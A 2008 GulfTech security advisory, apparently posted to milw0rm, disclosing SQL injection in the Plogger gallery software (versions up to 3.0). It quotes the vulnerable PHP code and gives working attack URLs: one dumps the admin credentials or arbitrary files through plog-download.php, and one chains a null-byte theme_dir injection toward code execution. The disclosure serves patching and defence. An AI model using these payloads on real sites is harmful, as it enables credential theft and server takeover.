@@ -1,0 +1,119 @@
+##########################################################
+# GulfTech Security Research              August 05, 2008
+##########################################################
+# Vendor : Mike Johnson
+# URL : http://www.plogger.org/
+# Version : Plogger <= 3.0
+# Risk : SQL Injection
+##########################################################
+
+
+Description:
+Plogger is a popular online gallery tool written in php that
+allows users to create an online gallery. It is vulnerable to
+SQL Injection issues, which also allow for arbitrary file
+disclosure since certain data from the returned SQL results is
+used as a filename argument when calling file_get_contents().
+Together these issues can be used to completely take over the
+vulnerable Plogger application. All users should upgrade their
+Plogger installations as soon as possible.
+
+
+
+SQL Injection:
+There are a number of SQL Injection issues within plogger. The
+issues can be found in plog-download.php, and plog-remote.php
+As mentioned earlier this issue also allows for the download
+of arbitrary files on the target web server.
+
+elseif($type == "album" || $type == "search"){
+foreach ($checked as $pid){
+    $query = "SELECT * FROM `".TABLE_PREFIX."pictures` WHERE `id`='".$pid."'";
+    $result = run_query($query);
+           
+    while ($row = mysql_fetch_assoc($result)){
+    $file_contents = file_get_contents("images/".$row["path"], true);
+    $zipfile -> add_file($file_contents, $row["path"]);
+    }
+    }
+}
+
+The above code comes from plog-download.php @ lines 285-297
+and shows how both SQL Injection and arbitrary file access are
+possible via the same flaw. The "checked" variable is taken
+directly from $_REQUEST['checked'] and never get's sanitized.
+The issues in plog-remote.php are similar and basically come
+down to the various commands sending unsanitized gpc variables
+to the get_album_by_name() function. The only commands within
+plog-remote.php that are not vuln are "fetch-albums" and "login"
+
+/plog-download.php?dl_type=album&checked[]=' UNION SELECT concat
+(admin_username,char(58),admin_password),0,0,0,0,0,0,0,0,0,0,0,0
+,0,0 FROM plogger_config/*
+
+The above url would successfully download the admin credentials
+in the form of a zip file. To read arbitrary files on the server
+vs reading admin credentials an attacker simply need to supply
+the relative location of a file on the webserver in place of the
+data in the first column of the union select above. It is also
+worth mentioning that once an attacker has admin access, executing
+arbitrary code is very much possible by updating the "theme_dir"
+settings in the database to include an arbitrary path to an
+uploaded image, that is terminated with a null byte.
+
+// insert into database
+$new_theme_dir = basename($_REQUEST["activate"]);
+$metafile = $config['basedir'] . '/themes/' . $new_theme_dir . '/meta.php';
+if (file_exists($metafile)) {
+    include($metafile);
+    $sql = 'UPDATE '.TABLE_PREFIX.'config SET `theme_dir` = \''.$new_theme_dir.'\'';
+    $name = $theme_name . ' ' . $version;
+    if (mysql_query($sql)) {
+        $output .= '<p class="actions">' . sprintf(plog_tr("Activated New Theme
+        <strong>%s</strong>"),$name). '</p>';
+    } else {
+        $output .= '<p class="errors">' . plog_tr("Error Activating Theme!") . '</p>';
+    };
+
+    // update config variable if page doesn't refresh
+    $config["theme_dir"] = $new_theme_dir;
+} else {
+        $output .= '<p class="errors">' . plog_tr("No such theme") . '</p>';
+};
+
+The above code comes from /admin/plog-themes.php @ lines 40-57 and
+shows a possible avenue for attackers to use in order to update the
+'theme_dir' in the database. The only trick to this is we have make
+the "activate" parameter pass both the file_exists() check, the
+basename() check, and still have it update the "theme"dir" data in
+the database with our arbitrary file path.
+
+/admin/plog-themes.php?activate=%00', `theme_dir` = concat
+(feed_title,char(0)) -- *
+
+The above url will successfully copy the data that is contained
+within the "feed_title" column in the database to the "theme_dir"
+column, while at the same time passing both sanity checks. The
+"feed_title" column can be updated from the main administrative
+options and gladly accepts our arbitrary traversed file path leading
+to the image file containing malicious php code. Since the first byte
+of our "activate" parameter contains a null byte the file_exists()
+check only sees "/themes/" as the path, instead of the data contained
+in the "activate" parameter, and thus passes the file_exists() check.
+I terminate the above query with " -- " vs "/*" since the basename()
+function will cause problems if we terminate the query this way due
+to the backslash that would be used in the query termination.
+
+
+
+Solution:
+Fixes for the issues mentioned in this advisory are already available
+via the Plogger public SVN, and a new version of Plogger which also
+addresses these issues will be available later in the week.
+
+
+
+Credits:
+James Bercegay of the GulfTech Security Research Team
+
+# milw0rm.com [2008-08-05]
